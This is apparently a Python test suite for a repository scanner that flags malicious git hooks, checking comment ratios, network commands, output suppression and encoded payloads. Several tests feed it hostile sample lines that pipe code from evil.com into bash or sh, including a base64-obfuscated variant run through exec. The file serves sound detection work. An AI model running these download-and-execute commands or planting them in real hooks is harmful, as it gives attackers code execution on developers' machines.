"""
Tests for hook_scanner module — Module 2.

FlexPay fixture loaded from conftest.py. Clean repo fixture loaded from conftest.py.
No network calls.
"""

from unittest.mock import Mock, patch

from repo_guard.github_client import GitHubClientError
from repo_guard.models import Severity
from repo_guard.modules.hook_scanner import scan, _calculate_comment_ratio
from tests.conftest import load_fixture, FLEXPAY_DIR


class TestCalculateCommentRatio:
    def test_all_comments(self):
        content = "# comment 1\n# comment 2\n# comment 3\n"
        assert _calculate_comment_ratio(content) == 1.0

    def test_no_comments(self):
        content = "echo hello\ncurl example.com\n"
        assert _calculate_comment_ratio(content) == 0.0

    def test_mixed(self):
        content = "# comment\necho hello\n# another comment\ncurl example.com\n"
        assert _calculate_comment_ratio(content) == 0.5

    def test_empty_content(self):
        assert _calculate_comment_ratio("") == 0.0

    def test_only_whitespace(self):
        assert _calculate_comment_ratio("  \n  \n") == 0.0


class TestHookScannerFlexPay:
    """The FlexPay fixture is the canary — must trigger CRITICAL/WARNING."""

    def _make_client(self) -> Mock:
        flexpay_hook = load_fixture(".githooks/post-checkout")
        mock_tree = [
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "abc", "size": 500},
        ]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = flexpay_hook
        return client

    def test_flexpay_hook_detects_execution_patterns(self):
        result = scan(self._make_client(), "flexpay", "repo")
        assert result.module_name == "hook_scanner"
        assert result.severity in (Severity.WARNING, Severity.CRITICAL)
        critical_findings = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical_findings) >= 1

    def test_flexpay_hook_finds_network_command(self):
        result = scan(self._make_client(), "flexpay", "repo")
        network_findings = [f for f in result.findings if "Network command" in f.message]
        assert len(network_findings) >= 1

    def test_flexpay_hook_detects_base64_payload(self):
        result = scan(self._make_client(), "flexpay", "repo")
        b64_findings = [f for f in result.findings if "Base64" in f.message]
        assert len(b64_findings) >= 1

    def test_flexpay_hook_comment_ratio_flagged(self):
        flexpay_hook = load_fixture(".githooks/post-checkout")
        ratio = _calculate_comment_ratio(flexpay_hook)
        assert ratio > 0.7, f"Expected ratio > 0.7 for FlexPay fixture, got {ratio}"
        result = scan(self._make_client(), "flexpay", "repo")
        ratio_findings = [f for f in result.findings if "comment-to-code" in f.message.lower()]
        assert len(ratio_findings) >= 1
        assert "84%" in ratio_findings[0].message or "85%" in ratio_findings[0].message


class TestHookScannerClean:
    """The clean repo fixture should return CLEAN (no .githooks/ directory)."""

    def test_no_githooks_directory_returns_clean(self):
        client = Mock()
        client.get_tree.return_value = [
            {"path": "README.md", "type": "blob", "sha": "abc", "size": 50},
            {"path": "src/main.py", "type": "blob", "sha": "def", "size": 100},
        ]
        result = scan(client, "owner", "clean-repo")
        assert result.severity == Severity.CLEAN
        assert any("No .githooks directory" in f.message for f in result.findings)

    def test_tree_fetch_failure_returns_info(self):
        client = Mock()
        client.get_tree.side_effect = GitHubClientError("API error")
        result = scan(client, "owner", "repo")
        assert result.severity == Severity.INFO
        assert "Could not fetch" in result.findings[0].message


class TestHookScannerPatterns:
    """Test individual execution pattern detection."""

    def _make_client(self, content: str) -> Mock:
        mock_tree = [{"path": ".githooks/pre-commit", "type": "blob", "sha": "abc", "size": len(content)}]
        client = Mock()
        client.get_tree.return_value = mock_tree
        client.get_file_content.return_value = content
        return client

    def test_curl_piped_to_bash_detected(self):
        result = scan(self._make_client("curl -s https://evil.com/init.sh | bash"), "o", "r")
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert any("piped to shell" in f.message for f in critical)

    def test_wget_piped_to_sh_detected(self):
        result = scan(self._make_client('wget -qO- "http://evil.com/payload" | sh'), "o", "r")
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert any("piped to shell" in f.message for f in critical)

    def test_output_suppression_detected(self):
        result = scan(self._make_client("curl evil.com | bash >/dev/null 2>&1"), "o", "r")
        suppression_findings = [f for f in result.findings if "Output suppression" in f.message]
        assert len(suppression_findings) >= 1

    def test_nohup_detected(self):
        result = scan(self._make_client("nohup python3 -c 'import os; os.system(\"curl evil.com | bash\")' &"), "o", "r")
        nohup_findings = [f for f in result.findings if "nohup" in f.message.lower()]
        assert len(nohup_findings) >= 1

    def test_benign_hook_no_false_positives(self):
        result = scan(self._make_client("#!/bin/sh\n# Auto-format on commit\nblack .\n"), "o", "r")
        critical = [f for f in result.findings if f.severity == Severity.CRITICAL]
        assert len(critical) == 0

    def test_base64_payload_detected(self):
        import base64
        payload = 'import os; os.system("curl evil.com | bash")'
        encoded = base64.b64encode(payload.encode()).decode()
        content = f"python3 -c \"exec(base64.b64decode('{encoded}'))\""
        result = scan(self._make_client(content), "o", "r")
        b64_findings = [f for f in result.findings if "Base64" in f.message]
        assert len(b64_findings) >= 1

    def test_no_hooks_returns_clean_with_note(self):
        client = Mock()
        client.get_tree.return_value = []
        result = scan(client, "o", "r")
        assert result.severity == Severity.CLEAN
        assert any("No .githooks directory" in f.message for f in result.findings)

    def test_curl_with_many_flags_captures_url(self):
        """Proof test: curl -s -o file https://evil.com must capture https://evil.com."""
        content = "curl -s -o /dev/null https://evil.com/payload"
        result = scan(self._make_client(content), "o", "r")
        network_findings = [f for f in result.findings if "Network command" in f.message]
        assert len(network_findings) >= 1
        assert "https://evil.com/payload" in network_findings[0].details.get("url", "")
